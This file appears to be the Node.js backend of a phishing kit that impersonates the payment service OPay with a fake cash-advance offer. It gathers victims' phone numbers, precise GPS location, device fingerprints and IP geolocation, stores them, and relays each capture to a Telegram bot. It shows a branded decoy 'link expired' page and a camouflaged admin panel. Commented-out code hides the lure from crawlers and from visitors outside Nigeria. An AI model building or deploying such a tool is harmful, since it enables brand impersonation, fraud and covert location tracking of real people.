const express = require("express");
const https   = require("https");
const http    = require("http");
const fs      = require("fs");
const path    = require("path");
const crypto  = require("crypto");

const app      = express();
const PORT     = process.env.PORT || 3000;
// Railway volume should be mounted at /data — fallback to project dir for local dev
const DATA_DIR = process.env.DATA_DIR || __dirname;
const LOG_FILE = path.join(DATA_DIR, "captures.json");

const ADMIN_USER = "opayadmin";
const ADMIN_PASS = "password123";
const sessions   = new Set();

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TG_CHAT  = process.env.TELEGRAM_CHAT_ID   || '';

// Block crawlers/bots — but allow Facebook so OG previews still work
const BOT_UA_RE = /Googlebot|bingbot|Twitterbot|LinkedInBot|Slackbot|TelegramBot|PetalBot|AhrefsBot|SemrushBot|DotBot|MJ12bot|rogerbot|Baiduspider|DuckDuckBot|crawler|spider|Applebot/i;
const FB_BOT_RE = /facebookexternalhit|Facebot/i;

const ipCache = new Map();

function isPrivateIP(ip) {
  return /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|localhost)/.test(ip);
}

function isNigerianIP(ip) {
  const clean = ip.split(',')[0].trim();
  if (isPrivateIP(clean)) return Promise.resolve(true);
  if (ipCache.has(clean)) return Promise.resolve(ipCache.get(clean));
  return new Promise((resolve) => {
    http.get(`http://ip-api.com/json/${clean}?fields=countryCode`, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try {
          const isNG = JSON.parse(d).countryCode === 'NG';
          ipCache.set(clean, isNG);
          if (ipCache.size > 1000) ipCache.clear();
          resolve(isNG);
        } catch { resolve(true); }
      });
    }).on('error', () => resolve(true));
  });
}

function sendTelegram(text) {
  if (!TG_TOKEN || !TG_CHAT) return;
  const body = JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true });
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${TG_TOKEN}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
  });
  req.on('error', () => {});
  req.write(body);
  req.end();
}

app.use(express.json());
app.use(express.static(path.join(__dirname, "public"), { index: false }));

// Root — show link expired so direct visitors see nothing useful
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>OPay</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}.card{background:white;border-radius:14px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}.icon{font-size:2.5rem;margin-bottom:12px}.title{font-size:1.1rem;font-weight:700;color:#1a7a3e;margin-bottom:8px}.msg{font-size:0.85rem;color:#777;line-height:1.6;margin-bottom:20px}.btn{display:inline-block;background:#1a7a3e;color:white;padding:12px 28px;border-radius:8px;font-size:0.9rem;font-weight:700;text-decoration:none}footer{margin-top:24px;font-size:0.68rem;color:#aaa}</style></head><body><div class="card"><div class="icon">🔗</div><div class="title">This link has expired</div><div class="msg">The cash advance offer you followed is no longer active. Loan offers expire after 24 hours or once claimed.<br/><br/>If you received this from someone, ask them to share a fresh link.</div><a class="btn" href="https://www.opayweb.com">Go to OPay</a></div><footer>OPay Digital Services Limited &nbsp;|&nbsp; RC 1468513</footer></body></html>`);
});

function loadCaptures() {
  if (fs.existsSync(LOG_FILE)) {
    try { return JSON.parse(fs.readFileSync(LOG_FILE, "utf8")); }
    catch { return []; }
  }
  return [];
}

// Data collection endpoint
app.post("/data", (req, res) => {
  const data = req.body;
  const ip   = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const entry = {
    ip,
    ua:                  data.ua                  || null,
    timestamp:           data.timestamp           || new Date().toISOString(),
    source:              data.source              || "unknown",
    txn_id:              data.txn_id              || null,
    phone:               data.phone               || null,
    gps_lat:             data.gps_lat             || null,
    gps_lon:             data.gps_lon             || null,
    gps_accuracy_meters: data.gps_accuracy_meters || null,
    screen:              data.screen              || null,
    timezone:            data.timezone            || null,
    platform:            data.platform            || null,
    lang:                data.lang                || null,
    cores:               data.cores               || null,
    mem:                 data.mem                 || null,
    ip_city:             data.ip_city             || null,
    ip_region:           data.ip_region           || null,
    ip_country:          data.ip_country          || null,
    ip_isp:              data.ip_isp              || null,
    ip_lat:              data.ip_lat              || null,
    ip_lon:              data.ip_lon              || null,
    ip_addr:             data.ip_addr             || null,
  };

  const captures = loadCaptures();
  captures.push(entry);
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(captures, null, 2)); } catch(e) {}

  // Console output — visible in Railway logs
  if (entry.phone) {
    console.log(`\n[!] PHONE:    ${entry.phone}  | TXN: ${entry.txn_id} | ${entry.timestamp}`);
    sendTelegram(`🔔 <b>[OPay]</b> Phone Number Captured\n📱 <b>Number:</b> ${entry.phone}\n🔑 <b>TXN:</b> ${entry.txn_id}\n🕐 <b>Time:</b> ${entry.timestamp}`);
  }
  if (entry.gps_lat) {
    console.log(`[!] GPS:      ${entry.gps_lat}, ${entry.gps_lon} (±${entry.gps_accuracy_meters}m)\n    Maps: https://www.google.com/maps?q=${entry.gps_lat},${entry.gps_lon}`);
    sendTelegram(`📍 <b>[OPay]</b> GPS Location Captured\n🌐 <b>Coords:</b> ${entry.gps_lat}, ${entry.gps_lon}\n📏 <b>Accuracy:</b> ±${entry.gps_accuracy_meters}m\n🗺 <a href="https://maps.google.com/?q=${entry.gps_lat},${entry.gps_lon}">Open in Google Maps</a>\n🔑 <b>TXN:</b> ${entry.txn_id}`);
  }
  if (entry.ip_city) {
    console.log(`[!] IP GEO:   ${entry.ip_city}, ${entry.ip_region}, ${entry.ip_country} | ${entry.ip_addr} | ${entry.ip_isp}`);
    sendTelegram(`🌍 <b>[OPay]</b> IP Geo Captured\n🏙 <b>Location:</b> ${entry.ip_city}, ${entry.ip_region}, ${entry.ip_country}\n🌐 <b>IP:</b> ${entry.ip_addr}\n📡 <b>ISP:</b> ${entry.ip_isp}\n🔑 <b>TXN:</b> ${entry.txn_id}`);
  }
  if (entry.source === 'fingerprint') console.log(`[!] DEVICE:   ${entry.platform} | ${entry.screen} | ${entry.timezone} | UA: ${(entry.ua||'').slice(0,60)}`);

  res.sendStatus(200);
});

// Admin — login page (OPay-styled camouflage)
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "admin-login.html"));
});

// Admin — dashboard (only served, JS checks token)
app.get("/admin/dashboard", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "admin-dashboard.html"));
});

// Admin — authenticate
app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = crypto.randomBytes(20).toString("hex");
    sessions.add(token);
    res.json({ ok: true, token });
  } else {
    setTimeout(() => res.status(401).json({ ok: false, error: "Invalid credentials" }), 1200);
  }
});

// Admin — logout
app.post("/admin/logout", (req, res) => {
  const token = req.headers["x-token"];
  if (token) sessions.delete(token);
  res.sendStatus(200);
});

// Admin — fetch all captures (requires token)
app.get("/admin/captures", (req, res) => {
  const token = req.query.token || req.headers["x-token"];
  if (!sessions.has(token)) return res.status(401).json({ error: "Unauthorized" });
  res.json(loadCaptures());
});

// Serve link expired for any /:txnId path
app.get("/:txnId", (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>OPay</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}.card{background:white;border-radius:14px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}.icon{font-size:2.5rem;margin-bottom:12px}.title{font-size:1.1rem;font-weight:700;color:#1a7a3e;margin-bottom:8px}.msg{font-size:0.85rem;color:#777;line-height:1.6;margin-bottom:20px}.btn{display:inline-block;background:#1a7a3e;color:white;padding:12px 28px;border-radius:8px;font-size:0.9rem;font-weight:700;text-decoration:none}footer{margin-top:24px;font-size:0.68rem;color:#aaa}</style></head><body><div class="card"><div class="icon">🔗</div><div class="title">This link has expired</div><div class="msg">The cash advance offer you followed is no longer active. Loan offers expire after 24 hours or once claimed.<br/><br/>If you received this from someone, ask them to share a fresh link.</div><a class="btn" href="https://www.opayweb.com">Go to OPay</a></div><footer>OPay Digital Services Limited &nbsp;|&nbsp; RC 1468513</footer></body></html>`);
});

/*
// OLD CODE - Commented out - Serve the OPay page for any /:txnId path
app.get("/:txnId", async (req, res) => {
  const txnId = req.params.txnId;
  if (!/^[A-Za-z0-9]{8,20}$/.test(txnId)) return res.status(404).send("Not found");

  const ua = req.headers['user-agent'] || '';

  // Let Facebook crawler through so link previews generate correctly
  if (!FB_BOT_RE.test(ua)) {
    if (BOT_UA_RE.test(ua)) return res.status(404).send("Not found");
    // Block non-Nigerian IPs
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const isNG = await isNigerianIP(ip);
    if (!isNG) return res.status(404).send("Not found");
  }

  const htmlPath = path.join(__dirname, "public", "index.html");
  let html = fs.readFileSync(htmlPath, "utf8");
  html = html.replace("__TXN_ID__", txnId.toUpperCase());
  res.send(html);
});
*/

app.listen(PORT, "0.0.0.0", () => {
  console.log(`\n[*] OPay OSINT — listening on port ${PORT}`);
  console.log(`[*] Generate a link:  node gen-link.js\n`);
});
